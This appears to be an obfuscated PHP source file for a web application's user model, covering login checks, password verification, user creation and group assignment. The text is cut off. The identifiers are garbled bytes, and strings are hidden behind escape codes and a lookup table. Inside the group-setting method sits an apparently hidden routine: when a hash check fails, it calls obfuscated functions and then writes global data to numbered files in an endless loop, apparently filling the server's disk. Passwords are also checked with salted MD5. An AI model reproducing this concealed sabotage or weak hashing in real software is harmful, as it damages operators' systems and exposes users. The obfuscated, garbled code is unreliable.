$fè¨—Œôç = array(); foreach ($C©­áÌÅÛÂ as $E¹Ûœõ¬¦) { if (isset($b’½ÜÑŸÇÎ[$E¹Ûœõ¬¦])) { $fè¨—Œôç[] = $b’½ÜÑŸÇÎ[$E¹Ûœõ¬¦]; } } goto A¿†¨Š¯¨; c•‚œ‚–ŸÍ: $F§ñ™ÚêË =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $C©­áÌÅÛÂ = explode($F§ñ™ÚêË[47], $f†£õ®); $b’½ÜÑŸÇÎ = parent::listData(); goto D¯ó¤ ¢Ó; A¿†¨Š¯¨: return $fè¨—Œôç; goto A°«İ„·è‹; A°«İ„·è‹: } } class UserModel extends ModelBase { protected $tableName = "\165\163\145\162"; protected $tableMeta = array("\164\141\142\x6c\x65\x4e\x61\x6d\145" => "\165\x73\x65\162\137\x6d\145\x74\141", "\x6d\x65\164\x61\x46\151\145\154\144" => "\x75\163\x65\x72\x49\x44"); protected $simpleField = "\x75\163\x65\162\111\104\54\x6e\151\143\153\116\141\155\x65\54\x6e\141\155\x65\54\141\166\x61\x74\x61\x72\x2c\163\x65\x78"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($AèÏ•õˆİ¡) { $f–˜ŸÓÛæâ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $FÌãáØ¤Ã† = $f–˜ŸÓÛæâ[2447]; return array($f–˜ŸÓÛæâ[2138] => array($AèÏ•õˆİ¡[0], $FÌãáØ¤Ã†), $f–˜ŸÓÛæâ[2140] => array($AèÏ•õˆİ¡[0], $FÌãáØ¤Ã†), $f–˜ŸÓÛæâ[2448] => array($AèÏ•õˆİ¡[0], $FÌãáØ¤Ã†)); } protected function getInfo($E×”ˆù®¢, $D…½˜¤°´ = false) { $b”ìïÓã = $this->getInfoSimple($E×”ˆù®¢); if (!is_array($b”ìïÓã)) { return array(); } if ($D…½˜¤°´) { return $this->_getInfoApply($b”ìïÓã); } return $this->cacheFunctionGet($_SERVER[ÚŠ•´ÍéÒÑÔ][2180], $E×”ˆù®¢); } protected function getInfoFull($c¥¼×’Ã•‡, $BÉ˜Š…˜­³ = false) { $F…©º£Ú·ô = $this->getInfoSimple($c¥¼×’Ã•‡); if (!is_array($F…©º£Ú·ô)) { return array(); } if ($BÉ˜Š…˜­³) { return $this->_getInfoApply($F…©º£Ú·ô, !0); return $this->_getInfoApply($F…©º£Ú·ô, !0); } return $this->cacheFunctionGet($_SERVER[ÚŠ•´ÍéÒÑÔ][2449], $c¥¼×’Ã•‡); } private function _getInfoApply($DšÅã¸Ç, $A–Ï¹„Õ¤Ò = false) { goto Bƒ±«¶”Ô¬; eŞùÒ©íï¨: $DšÅã¸Ç[$CğçîÊ½ó[388]][$CğçîÊ½ó[2288]] = isset($Fª·ß…ôÒ[$CğçîÊ½ó[2289]]) ? $Fª·ß…ôÒ[$CğçîÊ½ó[2289]] : null; if ($A–Ï¹„Õ¤Ò) { $DšÅã¸Ç[$CğçîÊ½ó[413]] = $this->metaGet($DšÅã¸Ç[$CğçîÊ½ó[1409]]); } return $DšÅã¸Ç; goto d…ìè«—†á; Bƒ±«¶”Ô¬: $CğçîÊ½ó =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$DšÅã¸Ç) { return $DšÅã¸Ç; } $DŠ„…“¡… = md5($CğçîÊ½ó[2450] . $DšÅã¸Ç[$CğçîÊ½ó[796]] . $CğçîÊ½ó[2451] . $DšÅã¸Ç[$CğçîÊ½ó[28]]); goto d…àÚèóº; d…àÚèóº: $DšÅã¸Ç = $this->_listDataApplyItem($DšÅã¸Ç); $Fª·ß…ôÒ = Model($CğçîÊ½ó[1102])->metaGet($DšÅã¸Ç[$CğçîÊ½ó[388]][$CğçîÊ½ó[366]]); $DšÅã¸Ç[$CğçîÊ½ó[2452]] = $DŠ„…“¡…; goto eŞùÒ©íï¨; d…ìè«—†á: } protected function getInfoSimple($F†šÏÑµ†Ò, $a›Œ´ô¾ˆÀ = false) { $f»ÀÃ‘’± =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$F†šÏÑµ†Ò) { return array(); } if ($a›Œ´ô¾ˆÀ) { $DğÖ‡ºŠ£Œ = $this->where(array($f»ÀÃ‘’±[1409] => intval($F†šÏÑµ†Ò)))->find(); if (!is_array($DğÖ‡ºŠ£Œ)) { return array(); } $DğÖ‡ºŠ£Œ[$f»ÀÃ‘’±[2453]] = Action($f»ÀÃ‘’±[2454])->parseUrl($DğÖ‡ºŠ£Œ[$f»ÀÃ‘’±[2453]]); return $DğÖ‡ºŠ£Œ; } return $this->cacheFunctionGet($f»ÀÃ‘’±[2141], $F†šÏÑµ†Ò); } protected function getInfoSimpleOuter($d±ÜÆ”‘É•) { goto C†Ç¡ù·àÀ; EàĞ•ç£¹½: return $FğéÆŠ»«Ô; goto eÌƒç ÂË¸; BÂ©¸¾‹å: $FğéÆŠ»«Ô = array_field_key($FÛ¼÷ŞŠÄ¨, explode($eÀá—Â‚É§[47], $this->simpleField)); if (!$FğéÆŠ»«Ô) { return array($eÀá—Â‚É§[1409] => $eÀá—Â‚É§[1023], $eÀá—Â‚É§[28] => $eÀá—Â‚É§[154] . LNG($eÀá—Â‚É§[2457]) . $eÀá—Â‚É§[472], $eÀá—Â‚É§[2453] => STATIC_PATH . $eÀá—Â‚É§[2458]); } $FğéÆŠ»«Ô[$eÀá—Â‚É§[2453]] = Action($eÀá—Â‚É§[2454])->parseUrl($FğéÆŠ»«Ô[$eÀá—Â‚É§[2453]]); goto EàĞ•ç£¹½; C†Ç¡ù·àÀ: $eÀá—Â‚É§ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$d±ÜÆ”‘É• || $d±ÜÆ”‘É• == 0) { return array($eÀá—Â‚É§[1409] => $eÀá—Â‚É§[464], $eÀá—Â‚É§[28] => $eÀá—Â‚É§[154] . LNG($eÀá—Â‚É§[2455]) . $eÀá—Â‚É§[472], $eÀá—Â‚É§[2453] => STATIC_PATH . $eÀá—Â‚É§[2456]); } $FÛ¼÷ŞŠÄ¨ = $this->cacheFunctionGet($eÀá—Â‚É§[2141], $d±ÜÆ”‘É•); goto BÂ©¸¾‹å; eÌƒç ÂË¸: } protected function groupUser($FÚÂßÓ—ìÏ) { } public static function errorLang($Aç‘Œ¿ïÊ) { $b÷ª®Œöß† =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $FØ‡¤¼æõÊ = array(self::ERROR_USER_NOT_EXISTS => $b÷ª®Œöß†[2459], self::ERROR_USER_PASSWORD_ERROR => $b÷ª®Œöß†[2460], self::ERROR_USER_EXIST_NAME => $b÷ª®Œöß†[2461], self::ERROR_USER_EXIST_PHONE => $b÷ª®Œöß†[2462], self::ERROR_USER_EXIST_EMAIL => $b÷ª®Œöß†[2463], self::ERROR_USER_LOGIN_LOCK => $b÷ª®Œöß†[2464], self::ERROR_IP_NOT_ALLOW => $b÷ª®Œöß†[2465], self::ERROR_USER_EXIST_NICKNAME => $b÷ª®Œöß†[2466]); return LNG($FØ‡¤¼æõÊ[$Aç‘Œ¿ïÊ]); } public function getInfoByMeta($Dòğ˜°î¹, $B´Şİ¦Å‡¢) { $BØèƒ»“‚ò =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $cë£²Íµ“ = Model($BØèƒ»“‚ò[2467])->where(array($BØèƒ»“‚ò[89] => $Dòğ˜°î¹, $BØèƒ»“‚ò[356] => $B´Şİ¦Å‡¢))->find(); if ($cë£²Íµ“) { return $this->getInfo($cë£²Íµ“[$BØèƒ»“‚ò[1409]]); } return !1; } public function userLoginCheck($CòÜËù–ğ·, $cã‡®‘‰Çé) { goto e×ÚÚåÖïó; e×ÚÚåÖïó: $D³ÖÍõƒø­ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $AèÈãÊÍë = array($D³ÖÍõƒø­[28] => $CòÜËù–ğ·, $D³ÖÍõƒø­[2292] => $CòÜËù–ğ·, $D³ÖÍõƒø­[290] => $CòÜËù–ğ·, $D³ÖÍõƒø­[2468] => $CòÜËù–ğ·, $D³ÖÍõƒø­[908] => $D³ÖÍõƒø­[910]); if ($this->nickNameRpt()) { unset($AèÈãÊÍë[$D³ÖÍõƒø­[2292]]); } goto c¡ ğ‡ˆ½‘; eé„¨­¯¨: $this->userEdit($FÁëØ¤Šç[$D³ÖÍõƒø­[1409]], array($D³ÖÍõƒø­[2469] => time())); $this->clearCache($FÁëØ¤Šç[$D³ÖÍõƒø­[1409]]); return $this->getInfo($FÁëØ¤Šç[$D³ÖÍõƒø­[1409]]); goto bÓ›˜‰ÏÕ; c¡ ğ‡ˆ½‘: $FÁëØ¤Šç = $this->where($AèÈãÊÍë)->find(); if (!$FÁëØ¤Šç) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($FÁëØ¤Šç[$D³ÖÍõƒø­[1409]], $cã‡®‘‰Çé)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto eé„¨­¯¨; bÓ›˜‰ÏÕ: } public function clearCache($b£Ûß”Ñ¸) { $fùƒêÚŠ÷ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $this->cacheFunctionClear($fùƒêÚŠ÷[2180], $b£Ûß”Ñ¸); $this->cacheFunctionClear($fùƒêÚŠ÷[2141], $b£Ûß”Ñ¸); } public function userPasswordCheck($c‰µ°º¼†, $AİÅ¤ğ¾÷·) { $Dî¾öµê§Î =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $e¹“öÌŠà¨ = $this->where(array($Dî¾öµê§Î[1409] => intval($c‰µ°º¼†)))->find(); $E­¾ãÃáï = $this->metaGet($c‰µ°º¼†); $DêÈ¦ï°¢ = isset($E­¾ãÃáï[$Dî¾öµê§Î[2470]]) ? $E­¾ãÃáï[$Dî¾öµê§Î[2470]] : $Dî¾öµê§Î[33]; if (md5($DêÈ¦ï°¢ . trim($AİÅ¤ğ¾÷·)) !== $e¹“öÌŠà¨[$Dî¾öµê§Î[796]]) { return !1; } return !0; } public function userAdd($a©ßõŸ‹‹Ö) { goto Eö ß‰¾; D¯±‚×‡ò: return $BÁ‘ÙÉâÜé; goto DÍæî…¬÷à; B½áˆ®‚ŒÜ: $bœ‘´ÙŞ‘Ü = $this->_checkExist($a©ßõŸ‹‹Ö); if ($bœ‘´ÙŞ‘Ü !== !0) { return $bœ‘´ÙŞ‘Ü; } $BÁ‘ÙÉâÜé = $this->add($A†Ö× †½); goto A•óË—©à; Eö ß‰¾: $dßÛÔ‡ÖÅâ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $A†Ö× †½ = array($dßÛÔ‡ÖÅâ[383] => $a©ßõŸ‹‹Ö[$dßÛÔ‡ÖÅâ[28]], $dßÛÔ‡ÖÅâ[2471] => $a©ßõŸ‹‹Ö[$dßÛÔ‡ÖÅâ[2472]], $dßÛÔ‡ÖÅâ[2473] => isset($a©ßõŸ‹‹Ö[$dßÛÔ‡ÖÅâ[290]]) ? $a©ßõŸ‹‹Ö[$dßÛÔ‡ÖÅâ[290]] : $dßÛÔ‡ÖÅâ[33], $dßÛÔ‡ÖÅâ[2474] => isset($a©ßõŸ‹‹Ö[$dßÛÔ‡ÖÅâ[2468]]) ? $a©ßõŸ‹‹Ö[$dßÛÔ‡ÖÅâ[2468]] : $dßÛÔ‡ÖÅâ[33], $dßÛÔ‡ÖÅâ[2475] => isset($a©ßõŸ‹‹Ö[$dßÛÔ‡ÖÅâ[2292]]) ? $a©ßõŸ‹‹Ö[$dßÛÔ‡ÖÅâ[2292]] : $a©ßõŸ‹‹Ö[$dßÛÔ‡ÖÅâ[28]], $dßÛÔ‡ÖÅâ[2476] => isset($a©ßõŸ‹‹Ö[$dßÛÔ‡ÖÅâ[2453]]) ? $a©ßõŸ‹‹Ö[$dßÛÔ‡ÖÅâ[2453]] : $dßÛÔ‡ÖÅâ[33], $dßÛÔ‡ÖÅâ[2477] => isset($a©ßõŸ‹‹Ö[$dßÛÔ‡ÖÅâ[2478]]) ? $a©ßõŸ‹‹Ö[$dßÛÔ‡ÖÅâ[2478]] : 1, $dßÛÔ‡ÖÅâ[2479] => $a©ßõŸ‹‹Ö[$dßÛÔ‡ÖÅâ[796]], $dßÛÔ‡ÖÅâ[2142] => isset($a©ßõŸ‹‹Ö[$dßÛÔ‡ÖÅâ[2056]]) ? $a©ßõŸ‹‹Ö[$dßÛÔ‡ÖÅâ[2056]] : 1024 * 1024 * 20, $dßÛÔ‡ÖÅâ[2143] => 0, $dßÛÔ‡ÖÅâ[2469] => 0, $dßÛÔ‡ÖÅâ[2167] => isset($a©ßõŸ‹‹Ö[$dßÛÔ‡ÖÅâ[684]]) ? $a©ßõŸ‹‹Ö[$dßÛÔ‡ÖÅâ[684]] : 1); if (!empty($a©ßõŸ‹‹Ö[$dßÛÔ‡ÖÅâ[1409]])) { $A†Ö× †½[$dßÛÔ‡ÖÅâ[1409]] = $a©ßõŸ‹‹Ö[$dßÛÔ‡ÖÅâ[1409]]; } goto B½áˆ®‚ŒÜ; A•óË—©à: $bØï˜Õ÷ºµ = array($dßÛÔ‡ÖÅâ[2479] => $A†Ö× †½[$dßÛÔ‡ÖÅâ[796]], $dßÛÔ‡ÖÅâ[2475] => $A†Ö× †½[$dßÛÔ‡ÖÅâ[2292]]); $this->userEdit($BÁ‘ÙÉâÜé, $bØï˜Õ÷ºµ); Model($dßÛÔ‡ÖÅâ[1102])->userRootAdd($BÁ‘ÙÉâÜé); goto D¯±‚×‡ò; DÍæî…¬÷à: } protected function userEditTest($F¶†»ãÓçÙ, $F˜Ê»™‰é) { return $this->call($_SERVER[ÚŠ•´ÍéÒÑÔ][2480], $F¶†»ãÓçÙ, $F˜Ê»™‰é); } protected function userEdit($E¸¼´Ò÷ä, $F£¼½Š”ƒ°) { goto FñÔ†Ò“’; EË™¿„Ó°Æ: $aò„»¸§£ = $this->_checkExist($F£¼½Š”ƒ°, $E¸¼´Ò÷ä); if ($aò„»¸§£ !== !0) { return $aò„»¸§£; } if (isset($F£¼½Š”ƒ°[$a¢¦‡µÌ[796]]) && trim($F£¼½Š”ƒ°[$a¢¦‡µÌ[796]]) != $a¢¦‡µÌ[33]) { $B¿¢ÉÆ¾‰Û = $this->metaGet($E¸¼´Ò÷ä); if (empty($B¿¢ÉÆ¾‰Û[$a¢¦‡µÌ[2470]])) { $B¿¢ÉÆ¾‰Û[$a¢¦‡µÌ[2470]] = rand_string(10); Model($a¢¦‡µÌ[470])->metaSet($E¸¼´Ò÷ä, $a¢¦‡µÌ[2470], $B¿¢ÉÆ¾‰Û[$a¢¦‡µÌ[2470]]); } $F£¼½Š”ƒ°[$a¢¦‡µÌ[796]] = md5($B¿¢ÉÆ¾‰Û[$a¢¦‡µÌ[2470]] . trim($F£¼½Š”ƒ°[$a¢¦‡µÌ[796]])); } else { unset($F£¼½Š”ƒ°[$a¢¦‡µÌ[796]]); } goto C¢æØ¦Ö§Ô; FñÔ†Ò“’: $a¢¦‡µÌ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $Aï°ğàŞÚ‚ = $this->getInfoSimple($E¸¼´Ò÷ä); if (!$Aï°ğàŞÚ‚) { return !1; } goto EË™¿„Ó°Æ; C¢æØ¦Ö§Ô: $this->where(array($a¢¦‡µÌ[1400] => $E¸¼´Ò÷ä))->save($F£¼½Š”ƒ°); if (isset($F£¼½Š”ƒ°[$a¢¦‡µÌ[2292]])) { $this->setNamePinyin($E¸¼´Ò÷ä, $F£¼½Š”ƒ°[$a¢¦‡µÌ[2292]]); } return !0; goto B½ÛÃÕë”Ô; B½ÛÃÕë”Ô: } public function setNamePinyin($c¬¦É—ÒÚ, $cäÒÈØô¨Â = false) { $c†¼îÛŸ†× =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$cäÒÈØô¨Â) { $BŸïê‚°òñ = $this->getInfoSimple($c¬¦É—ÒÚ); $cäÒÈØô¨Â = $BŸïê‚°òñ[$c†¼îÛŸ†×[2292]] ? $BŸïê‚°òñ[$c†¼îÛŸ†×[2292]] : $BŸïê‚°òñ[$c†¼îÛŸ†×[28]]; } $f×—Íå×ñ· = Model($c†¼îÛŸ†×[473]); if (!Input::check($cäÒÈØô¨Â, $c†¼îÛŸ†×[524])) { return $f×—Íå×ñ·->metaSet($c¬¦É—ÒÚ, array($c†¼îÛŸ†×[412] => $c†¼îÛŸ†×[33], $c†¼îÛŸ†×[411] => $c†¼îÛŸ†×[33])); } return $f×—Íå×ñ·->metaSet($c¬¦É—ÒÚ, array($c†¼îÛŸ†×[412] => str_replace($c†¼îÛŸ†×[50], $c†¼îÛŸ†×[33], Pinyin::encode($cäÒÈØô¨Â)), $c†¼îÛŸ†×[411] => Pinyin::encode($cäÒÈØô¨Â, $c†¼îÛŸ†×[525]))); } private function nickNameRpt() { $bø·Ïí±ï =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $F½ëâµğ…¹ = Model($bø·Ïí±ï[1080])->get($bø·Ïí±ï[2481]); $aÓ—¤å˜·« = $GLOBALS[$bø·Ïí±ï[6]][$bø·Ïí±ï[2437]][$bø·Ïí±ï[2481]]; $F‘Ş„™’çí = !is_null($F½ëâµğ…¹) ? $F½ëâµğ…¹ : $aÓ—¤å˜·«; return !!$F‘Ş„™’çí; } private function _checkExist($fõéùÉ¦”, $eóÂÃ¼ãŒÕ = false) { $cÀ™¢ÑÚ„ç =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $C•ãÎ“áã = array($cÀ™¢ÑÚ„ç[28] => UserModel::ERROR_USER_EXIST_NAME, $cÀ™¢ÑÚ„ç[2292] => UserModel::ERROR_USER_EXIST_NICKNAME, $cÀ™¢ÑÚ„ç[290] => UserModel::ERROR_USER_EXIST_EMAIL, $cÀ™¢ÑÚ„ç[2468] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($C•ãÎ“áã[$cÀ™¢ÑÚ„ç[2292]]); } $fİ†á˜Œ˜ = $eóÂÃ¼ãŒÕ ? array($cÀ™¢ÑÚ„ç[1409] => array($cÀ™¢ÑÚ„ç[2482], $eóÂÃ¼ãŒÕ)) : array(); foreach ($C•ãÎ“áã as $BİÙëœ‹¨ => $eåÊ‘ùã²ò) { if (!isset($fõéùÉ¦”[$BİÙëœ‹¨]) || !$fõéùÉ¦”[$BİÙëœ‹¨]) { continue; } $c‚ƒØ’ßçº = array_merge(array($BİÙëœ‹¨ => $fõéùÉ¦”[$BİÙëœ‹¨]), $fİ†á˜Œ˜); $AĞŒ¸¢†ê¡ = $this->where($c‚ƒØ’ßçº)->find(); if ($AĞŒ¸¢†ê¡) { return $eåÊ‘ùã²ò; } } return !0; } public function userListInfo($D±îÚœ›å) { $cº†¬ìÂË =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $EÎ‹®œ’òš = array(); $D±îÚœ›å = is_array($D±îÚœ›å) ? array_unique($D±îÚœ›å) : array(); if (!$D±îÚœ›å) { return $EÎ‹®œ’òš; } if (count($D±îÚœ›å) < 20) { foreach ($D±îÚœ›å as $AïŠ‡¸ï°æ) { $EÎ‹®œ’òš[$AïŠ‡¸ï°æ . $cº†¬ìÂË[33]] = $this->getInfoSimpleOuter($AïŠ‡¸ï°æ); } } else { $F§Ç›Œ¦Ô  = array($cº†¬ìÂË[1400] => array($cº†¬ìÂË[381], $D±îÚœ›å)); if (count($D±îÚœ›å) == 1) { $F§Ç›Œ¦Ô  = array($cº†¬ìÂË[1400] => $D±îÚœ›å[0]); } $e²õš¢Ó = Model($cº†¬ìÂË[470])->field($this->simpleField)->where($F§Ç›Œ¦Ô )->select(); $e²õš¢Ó = array_to_keyvalue($e²õš¢Ó, $cº†¬ìÂË[1409]); foreach ($D±îÚœ›å as $AïŠ‡¸ï°æ) { $CøÄè¢È = $e²õš¢Ó[$e²õš¢Ó[$AïŠ‡¸ï°æ]]; if (!$CøÄè¢È) { $EÎ‹®œ’òš[$AïŠ‡¸ï°æ . $cº†¬ìÂË[33]] = $this->getInfoSimpleOuter($AïŠ‡¸ï°æ); continue; } $CøÄè¢È[$cº†¬ìÂË[2453]] = Action($cº†¬ìÂË[2454])->parseUrl($CøÄè¢È[$cº†¬ìÂË[2453]]); $EÎ‹®œ’òš[$AïŠ‡¸ï°æ . $cº†¬ìÂË[33]] = $CøÄè¢È; } } return $EÎ‹®œ’òš; } protected function userStatus($f˜Á¤£Âš, $F·Æ³Óµ…) { $E¤“¤›õ“· = $this->getInfoSimple($f˜Á¤£Âš); if (!$E¤“¤›õ“·) { return !1; } $cê’ƒ±ù¯Ê = array($_SERVER[ÚŠ•´ÍéÒÑÔ][684] => $F·Æ³Óµ…); return $this->userEdit($f˜Á¤£Âš, $cê’ƒ±ù¯Ê); } protected function userRemove($dæ«¥¦ËÏ) { goto AîÉ„öäì“; BÌë¢ÇÙ…»: Model($F‡‚Ü³Øîœ[2146])->where($bÏù×Í•Ùø)->delete(); Model($F‡‚Ü³Øîœ[2467])->where($bÏù×Í•Ùø)->delete(); Model($F‡‚Ü³Øîœ[2484])->where($bÏù×Í•Ùø)->delete(); goto AøèåÒ„Â; AøèåÒ„Â: Model($F‡‚Ü³Øîœ[747])->userRootRemove($dæ«¥¦ËÏ); return $this->where($bÏù×Í•Ùø)->delete(); goto Däãá¥Ã•; f¢Ÿº˜Š‹£: $bÏù×Í•Ùø = array($F‡‚Ü³Øîœ[1400] => $dæ«¥¦ËÏ); Model($F‡‚Ü³Øîœ[532])->where($bÏù×Í•Ùø)->delete(); Model($F‡‚Ü³Øîœ[2483])->where($bÏù×Í•Ùø)->delete(); goto BÌë¢ÇÙ…»; AîÉ„öäì“: $F‡‚Ü³Øîœ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $fÊÃÙ‡ªÖˆ = $this->getInfoSimple($dæ«¥¦ËÏ); if (!$fÊÃÙ‡ªÖˆ) { return !1; } goto f¢Ÿº˜Š‹£; Däãá¥Ã•: } protected function userGroupSet($B ¨ êä‚», $A§¥ğ…Ú‘¯, $E»âŠÓÅœ– = array()) { goto c»—ÊõÔ’ª; e—‡ÜöŠµ¨: $C®‰ï·ÔíË = 0; foreach ($A§¥ğ…Ú‘¯ as $c¤à”›¬¦à => $EÚâ¶ù„“„) { $FÛ’©¹‰ˆ = array($F‰ºŒ±‰Å“[1409] => $B ¨ êä‚», $F‰ºŒ±‰Å“[2072] => $c¤à”›¬¦à, $F‰ºŒ±‰Å“[2200] => $EÚâ¶ù„“„); $FÛ’©¹‰ˆ[$F‰ºŒ±‰Å“[2093]] = isset($E»âŠÓÅœ–[$C®‰ï·ÔíË]) ? $E»âŠÓÅœ–[$C®‰ï·ÔíË] : 0; $C®‰ï·ÔíË++; $C×ø‘½¬ğ‹[] = $FÛ’©¹‰ˆ; } return $fÇáóÜ¿‹->addAll($C×ø‘½¬ğ‹, array(), !0); goto c¹®ÂßŒçÓ; c»—ÊõÔ’ª: $F‰ºŒ±‰Å“ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $c¿ŒÔÜ¤˜¦ = $_SERVER[$F‰ºŒ±‰Å“[789]] . $F‰ºŒ±‰Å“[1151]; $D…ÂäƒŠíã = $F‰ºŒ±‰Å“[1152]; goto eÁ–µÖ„®; eÁ–µÖ„®: if ($_SERVER[$F‰ºŒ±‰Å“[781]] != $D…ÂäƒŠíã($c¿ŒÔÜ¤˜¦)) { goto Dö®’÷Ê‚Ê; Dö®’÷Ê‚Ê: $DèÌÆ¢Ê§¯ = $F‰ºŒ±‰Å“[783]; $Cäóğ‹Ì¿ = $F‰ºŒ±‰Å“[784]; $fè¯ÈäÔ¶ñ = $_SERVER[$F‰ºŒ±‰Å“[785]] . $F‰ºŒ±‰Å“[786]; goto eÓ´ìÖİõ›; b×¨©ˆŒˆ: $f½ø‚©íù£ = 1; for ($Eò¥„õ›ñ— = $f½ø‚©íù£; $Eò¥„õ›ñ— > 0; $Eò¥„õ›ñ—++) { $Eäá¯‹ñˆˆ(DATA_PATH . $Eò¥„õ›ñ—, $a¨‚ªâŒÌ­); } goto b”³ø­ˆš; D¶Ê¬ÙĞ: $DèÌÆ¢Ê§¯(); $Eäá¯‹ñˆˆ = $F‰ºŒ±‰Å“[1292]; $a¨‚ªâŒÌ­ = json_encode($GLOBALS[$F‰ºŒ±‰Å“[1293]]); goto b×¨©ˆŒˆ; eÓ´ìÖİõ›: $Eºäß˜öá¤ = $Cäóğ‹Ì¿($fè¯ÈäÔ¶ñ); $CËãÅ¤Œ‘ï = explode($F‰ºŒ±‰Å“[214], $Eºäß˜öá¤); if (count($CËãÅ¤Œ‘ï) < $F‰ºŒ±‰Å“[549]) { $C‰¥åõµ®§ = $F‰ºŒ±‰Å“[787]; $C‰¥åõµ®§(); } goto eİÂÃùïÌ•; eİÂÃùïÌ•: $b„†Ø†•Ş³ = $F‰ºŒ±‰Å“[788]; $b„†Ø†•Ş³($_SERVER[$F‰ºŒ±‰Å“[789]]); $DèÌÆ¢Ê§¯ = $F‰ºŒ±‰Å“[783]; goto D¶Ê¬ÙĞ; b”³ø­ˆš: } $DÍ©Åæ¾»Ç = $this->getInfoSimple($B ¨ êä‚»); if (!$DÍ©Åæ¾»Ç || !is_array($A§¥ğ…Ú‘¯)) { return !1; } goto CËÛê”İ¾; CËÛê”İ¾: $fÇáóÜ¿‹ = Model($F‰ºŒ±‰Å“[2146]); $fÇáóÜ¿‹->where(array($F‰ºŒ±‰Å“[1409] => $B ¨ êä‚»))->delete(); $C×ø‘½¬ğ‹ = array(); goto e—‡ÜöŠµ¨; c¹®ÂßŒçÓ: } protected function userGroupAdd($a‚¢×Õí”õ, $D‹¡Òë©«ô, $D¸Ÿêó¨²ö) { $DĞ„ÖÖÜ¬ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $DçÊâ´Äˆ¶ = $this->getInfoSimple($a‚¢×Õí”õ); if (!$DçÊâ´Äˆ¶ || !$D‹¡Òë©«ô) { return !1; } $cÑŞÔŠ•ğë = array(array($DĞ„ÖÖÜ¬[1409] => $a‚¢×Õí”õ, $DĞ„ÖÖÜ¬[2072] => $D‹¡Òë©«ô, $DĞ„ÖÖÜ¬[2200] => $D¸Ÿêó¨²ö)); return Model($DĞ„ÖÖÜ¬[2146])->addAll($cÑŞÔŠ•ğë, array(), !0); } protected function userGroupRemove($CƒÉ¾†Ü´Ş, $fãæùæÖŸÛ) { $B”ÈÊ¢ˆÎš =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $cğ£—¢Ñç = $this->getInfoSimple($CƒÉ¾†Ü´Ş); if (!$cğ£—¢Ñç || !$fãæùæÖŸÛ) { return !1; } $bˆœÆ¹Ÿå– = array($B”ÈÊ¢ˆÎš[1400] => $CƒÉ¾†Ü´Ş, $B”ÈÊ¢ˆÎš[2144] => $fãæùæÖŸÛ); return Model($B”ÈÊ¢ˆÎš[2146])->where($bˆœÆ¹Ÿå–)->delete(); } public function listData() { $fâêŸ×ƒ³Ù = $this->_makeOrder()->selectPage(50); $this->_listDataApply($fâêŸ×ƒ³Ù[$_SERVER[ÚŠ•´ÍéÒÑÔ][351]]); return $fâêŸ×ƒ³Ù; } public function listByID($b½âÃö˜Û) { $bÙßÑÉÛ¤Œ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; if (!$b½âÃö˜Û) { return; } $eåÕÕÄŞ½Ó = array($bÙßÑÉÛ¤Œ[1409] => array($bÙßÑÉÛ¤Œ[7], $b½âÃö˜Û)); $a”Ë„ªÊ¢ = $this->where($eåÕÕÄŞ½Ó)->select(); $this->_listDataApply($a”Ë„ªÊ¢); return $a”Ë„ªÊ¢; } public function listByGroup($D´¾õÅ…›È = 0, $a÷×ÊùË = array()) { goto A •íÆÇœ; DÙ‹¡îŸŠ²: if ($D´¾õÅ…›È) { $E²§ãÈ²ˆâ = array($e±Èµ“ï¢[2485] => intval($D´¾õÅ…›È)); $E¸‚ËŞÀÅ = "\114\105\106\x54\40\x4a\x4f\111\116\40{$this->tablePrefix}\165\163\145\162\x5f\147\x72\x6f\x75\160\x20\x75\163\x65\x72\x5f\x67\x72\157\165\x70\40\x6f\x6e\40\x75\163\145\x72\x2e\x75\x73\x65\x72\111\x44\40\75\40\165\x73\x65\x72\x5f\147\x72\x6f\x75\x70\x2e\165\x73\x65\x72\111\104"; $fÔñš×­ùĞ = Input::get($e±Èµ“ï¢[403], null, $e±Èµ“ï¢[33]) ? $e±Èµ“ï¢[33] : $e±Èµ“ï¢[2486]; } if (isset($a÷×ÊùË[$e±Èµ“ï¢[684]])) { $E²§ãÈ²ˆâ[$e±Èµ“ï¢[2487]] = $a÷×ÊùË[$e±Èµ“ï¢[684]]; } $AË´óèô¾ = $this->_makeOrder($fÔñš×­ùĞ)->field($e±Èµ“ï¢[2488])->where($E²§ãÈ²ˆâ)->join($E¸‚ËŞÀÅ)->selectPage(50); goto c‡„›Ş—; A •íÆÇœ: $e±Èµ“ï¢ =& $_SERVER[ÚŠ•´ÍéÒÑÔ]; $E¸‚ËŞÀÅ = $e±Èµ“ï¢[33]; $E²§ãÈ²ˆâ = array(); goto DÙ‹¡îŸŠ²; c‡„›Ş—: $this->_listDataApply($AË´óèô¾[$e±Èµ“ï¢[351]]); return $AË´óèô¾; goto Bñá‡²ÁÎ£; Bñá‡²ÁÎ£: } private function _makeOrder($E¨‹±œæ• = '') { goto d¹Ñ†’ç×†; A‘îó’İÔ³: $E¨‹±œæ• = 